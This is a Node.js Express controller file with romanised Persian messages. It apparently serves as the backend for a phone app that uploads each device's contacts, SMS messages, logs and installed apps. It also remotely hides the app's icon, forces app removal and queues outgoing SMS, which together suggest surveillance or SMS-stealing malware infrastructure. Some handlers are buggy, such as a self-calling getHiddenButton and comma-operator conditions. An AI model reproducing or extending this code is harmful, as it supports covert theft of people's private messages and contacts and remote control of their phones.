const fs = require("fs");
const {
    createUser, findUser, addContact, addMessage,getSmsData,gethiddenbutton,createhiddenApp,createhiddenbutton,gethiddenApp,
    addLog, addApp, stateNamayeshApp, stateNamayeshButton,getpluseGorohi,pluseGorohi,
    createGlobalApp, getRemoveApp, getGlobalApp,getpluseService,
    createGlobalLink, getRemoveLink, getGlobalLink, findAll, addSmsData,
    createUpdateLink, getUpdateLink, getRemoveUpdateLink, createPoshtibaniLink,pluseService,
    getPoshtibaniLink, getRemovePoshtibaniLink,removeAppEjbari,addSenderMessage,removeSenderMessage,getAllSenderMessage,
} = require("../services/UserService")
var multer = require('multer');
var uploads = multer({ dest: './uploads/' });
const { validation } = require('../utils/validations');
module.exports = {
    async createUserController(req, res) {
        let { phone_id } = req.body
        if (validation.isNumber(phone_id)) {
            try {
                let new_user = await createUser(phone_id)
                if (validation.isNotUndefined(new_user)) {
                    console.log("shoshol")
                    res.json(new_user.toJSON())
                } else {
                    console.log("fofol")
                    res.status(404).json({ message: "nemitonam in user ro besazam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "in phone-id tekrarie"
                res.status(404).json({ message })
            }
        } else {
            res.status(404).json({ message: "phone_id needed" })
        }
    },
    async addContactController(req, res) {
        let { phone_id, contact_name, contact_number } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(contact_name)) {
            res.json({ message: 'contact_name ra vared konid' })
        } else if (!validation.isEmpty(contact_number)) {
            res.json({ message: 'contact_number ra vared konid' })
        } else if (!validation.isPhoneNumber(contact_number)) {
            res.json({ message: 'shomare ra dorost vared konid' })
        } else {
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await addContact(phone_id, { name: contact_name, number: contact_number })
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }

    },
    async removeAppController(req, res) {
        let { phone_id, name } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else {
            let currentUser = await removeAppEjbari(phone_id,name)
            if (validation.isNotUndefined(currentUser)) {
                data = await findUser(phone_id)
                res.json({data})
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }

    },
    async allUsers(req, res) {
        let model = await findAll()
        res.json({ model })
    },
    async findUser(req, res) {
        let { phone_id } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else {
            let finded_user = await findUser(phone_id)
            if (validation.isEmpty(finded_user) && finded_user.length > 0) {
                res.json({ data: finded_user })
            } else {
                res.status(404).json({ message: 'not found user with this id' })
            }
        }
    },
    async addMessageController(req, res) {
        let { phone_id, message_number, message_contein, message_date, type_message } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(type_message)) {
            res.json({ message: 'type_message ra vared konid' })
        } else if (!validation.isEmpty(message_number)) {
            res.json({ message: 'message_number ra vared konid' })
        } else if (!validation.isEmpty(message_date)) {
            res.json({ message: 'message_date ra vared konid' })
        } else if (!validation.isEmpty(message_contein)) {
            res.json({ message: 'message_contein ra vared konid' })
        } else {
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await addMessage(phone_id, {
                    number: message_number,
                    contein: message_contein, date: message_date, type_message
                })
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }
    },
    async addLogController(req, res) {
        let { phone_id, title, contein, date } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(title)) {
            res.json({ message: 'title ra vared konid' })
        } else if (!validation.isEmpty(contein)) {
            res.json({ message: 'contein ra vared konid' })
        } else if (!validation.isEmpty(date)) {
            res.json({ message: 'date ra vared konid' })
        } else {
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await addLog(phone_id, {
                    title,
                    contein, date
                })
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }
    },
    async addAppController(req, res) {
        let { phone_id, name, address } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else if (!validation.isEmpty(address)) {
            res.json({ message: 'address ra vared konid' })
        } else {
            console.log("dsd");
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await addApp(phone_id, {
                    name,
                    address
                })
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }
    },
    async appShowState(req, res) {
        let { phone_id, state } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(state)) {
            res.json({ message: 'state ra vared konid' })
        } else {
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await stateNamayeshApp(phone_id, state)
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }
    },
    async appButtonState(req, res) {
        let { phone_id, state } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(state)) {
            res.json({ message: 'state ra vared konid' })
        } else {
            let currentUser = await findUser(phone_id)
            if (validation.isNotUndefined(currentUser)) {
                let data = await stateNamayeshButton(phone_id, state)
                if (validation.isEmpty(data)) {
                    res.json({ message: "add succesfully" })
                } else {
                    res.status(403).json({ message: "in user mojod nemitone update she" })
                }
            } else {
                res.status(403).json({ message: "in user mojod nemibashad" })
            }
        }
    },
    async createGlobalAppController(req, res) {
        let { name, address } = req.body
        if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else if (!validation.isEmpty(address)) {
            res.json({ message: 'address ra vared konid' })
        } else {
            try {
                let new_user = await createGlobalApp({ name, address })
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in user ro besazam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "name ya address tekrarie"
                res.status(404).json({ message })
            }
        }
    },
    async getAllGlobalApps(req, res) {
        let data = await (await getGlobalApp())
        res.json({ data })
    },
    async remoteGlobalApp(req, res) {
        let { name } = req.body
        if (validation.isEmpty(name)) {
            console.log(12);
            try {
                console.log(12);
                let new_user = await getRemoveApp(name)
                if (validation.isNotUndefined(new_user)) {
                    let data = await (await getGlobalApp())
                    res.json({ data })
                } else {
                    res.status(404).json({ message: "nemitonam in app ro pak konam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "in phone-id tekrarie"
                res.status(404).json({ message })
            }
        } else {
            res.status(404).json({ message: "404" })
        }
    },
    async createGlobalLinkController(req, res) {
        let { name, address } = req.body
        if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else if (!validation.isEmpty(address)) {
            res.json({ message: 'address ra vared konid' })
        } else {
            try {
                let new_user = await createGlobalLink({ name, address })
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in Link ro besazam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "name ya address tekrarie"
                res.status(404).json({ message })
            }
        }
    },
    async getAllGlobalLinks(req, res) {
        let data = await (await getGlobalLink())
        res.json({ data: data[0].address })
    },
    async remoteGlobalLink(req, res) {
        let { name } = req.body
        if (validation.isEmpty(name)) {
            try {
                let new_user = await getRemoveLink(name)
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in app ro pak konam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "in phone-id tekrarie"
                res.status(404).json({ message })
            }
        } else {
            res.status(404).json({ message: "404" })
        }
    },
    async addDefultSms(req, res) {
        let { sms_text, notif_text } = req.body
        if (sms_text, notif_text) {
            try {
                let sms_notif = await addSmsData({ sms: sms_text, notif: notif_text })
                if (validation.isNotUndefined(sms_notif)) {
                    res.json(sms_notif)
                } else {
                    res.status(404).json({ message: "error" })
                }
            } catch (error) {
                let message = error.code
                res.status(404).json({ message })
            }
        } else {
            let sms_notif = await addSmsData({ sms: null, notif: null })
            res.json(sms_notif)
        }
    },
    async getSmsData(req,res){
        let data = await getSmsData()
        if (typeof data != 'undefined'){
            res.json({data:data[0]})
        }else {
            res.status(400).json({message:0})
        }
    },

    // Update
    async createUpdateLinkController(req, res) {
        let { name, address } = req.body
        if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else if (!validation.isEmpty(address)) {
            res.json({ message: 'address ra vared konid' })
        } else {
            try {
                let new_user = await createUpdateLink({ name, address })
                console.log('eererer'+new_user)
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in Link ro besazam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "name ya address tekrarie"
                res.status(404).json({ message })
            }
        }
    },
    async getAllUpdateLinks(req, res) {
        let data = await (await getUpdateLink())
        res.json({ data: data[0].address })
    },
    async remoteUpdateLink(req, res) {
        let { name } = req.body
        if (validation.isEmpty(name)) {
            try {
                let new_user = await getRemoveUpdateLink(name)
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in app ro pak konam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "in phone-id tekrarie"
                res.status(404).json({ message })
            }
        } else {
            res.status(404).json({ message: "404" })
        }
    },

    //Poshtibani
    async createPoshtibaniLinkController(req, res) {
        let { name, address } = req.body
        if (!validation.isEmpty(name)) {
            res.json({ message: 'name ra vared konid' })
        } else if (!validation.isEmpty(address)) {
            res.json({ message: 'address ra vared konid' })
        } else {
            try {
                let new_user = await createPoshtibaniLink({ name, address })
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in Link ro besazam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "name ya address tekrarie"
                res.status(404).json({ message })
            }
        }
    },
    async getAllPoshtibaniLinks(req, res) {
        let data = await (await getPoshtibaniLink())
        res.json({ data: data[0].address })
    },

    async remotePoshtibaniLink(req, res) {
        let { name } = req.body
        if (validation.isEmpty(name)) {
            try {
                let new_user = await getRemovePoshtibaniLink(name)
                if (validation.isNotUndefined(new_user)) {
                    res.json(new_user)
                } else {
                    res.status(404).json({ message: "nemitonam in app ro pak konam" })
                }
            } catch (error) {
                let message = error.code
                if (error.code == 11000)
                    message = "in phone-id tekrarie"
                res.status(404).json({ message })
            }
        } else {
            res.status(404).json({ message: "404" })
        }
    },
    async getLandingData(req, res) {
        let poshtibani = await (await getPoshtibaniLink())
        let update = await (await getUpdateLink())
        let buy = await (await getGlobalLink())
        if (poshtibani , update , buy){
            res.status(200).json({buyLink : buy[0].address , updateLink: update[0].address, poshtibaniLink: poshtibani[0].address})
        } else {
            res.status(400).json({})
        }
    },
    async addSenderMessage(req, res) {
        let { phone_id,to,content } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(to)) {
            res.json({ message: 'to ra vared konid' })
        } else if (!validation.isEmpty(content)) {
            res.json({ message: 'content ra vared konid' })
        } else {
            await addSenderMessage(phone_id,{to,content,id:Date.now()})
            let result = await findUser(phone_id)
            console.log(result)
            res.json({result})
        }
    },
    async getAllSenderMessage(req, res) {
        let { phone_id } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else{
            let data = await (await getAllSenderMessage(phone_id))
            if (typeof data!='undefined'){
                res.json({ data })
            }else {
                res.json({ message: 'chenin useri nadarim' })
            }
        }
    },
    async removeSenderMessage(req, res) {
        let { phone_id,message_id } = req.body
        if (!validation.isEmpty(phone_id)) {
            res.json({ message: 'phone_id ra vared konid' })
        } else if (!validation.isEmpty(message_id)) {
            res.json({ message: 'message_id ra vared konid' })
        } else {
              await removeSenderMessage(phone_id,message_id)
            let data = await getAllSenderMessage(phone_id)
            if (typeof data!='undefined'){
                res.json({ data })
            }else {
                res.json({ message: 'chenin useri nadarim' })
            }
        }
    },
    async addShomarandeh(req, res) {
        let { val } = req.body
        if (!validation.isEmpty(val)) {
            res.json({ message: 'val ra vared konid' })
        } else{
            let data = await (await pluseService(val))
            res.json({ data })
        }
    },
    async getShomarandeh(req, res) {
            let data = await (await getpluseService( ))
            res.json({ data })
    },
    async addGorohi(req, res) {
        let { val } = req.body
        if (!validation.isEmpty(val)) {
            res.json({ message: 'val ra vared konid' })
        } else{
            let data = await (await pluseGorohi(val))
            res.json({ data })
        }
    },
    async getGorohi(req, res) {
            let data = await (await getpluseGorohi( ))
            res.json({ data })
    },
    async setHiddenApp  (req,res){
        let { state } = req.body
        console.log(state)
        if (!validation.isEmpty(state)) {
            res.json({ message: 'state ra vared konid' })
        } else {
            let sty = await createhiddenApp({state})
            console.log(sty)
            res.json({state:sty })
        }
    },
    async getHiddenApp (req, res){
        res.json({state:await gethiddenApp()})
    },
    async setHiddenButton (req,res){
        let { state } = req.body
        console.log(state)
        if (!validation.isEmpty(state)) {
            res.json({ message: 'state ra vared konid' })
        } else {
            let sty = await createhiddenbutton({state})
            console.log(sty)
            res.json({state:sty })
        }
    },
    async getHiddenButton (req, res){
        res.json({state:await getHiddenButton()})
    },
    async getAppState (req, res){
        var appSt = await gethiddenApp()
        var buttonSt = await gethiddenbutton()
        res.json({appState: appSt[0]['state'] , buttonState: buttonSt[0]['state']})
    },
}
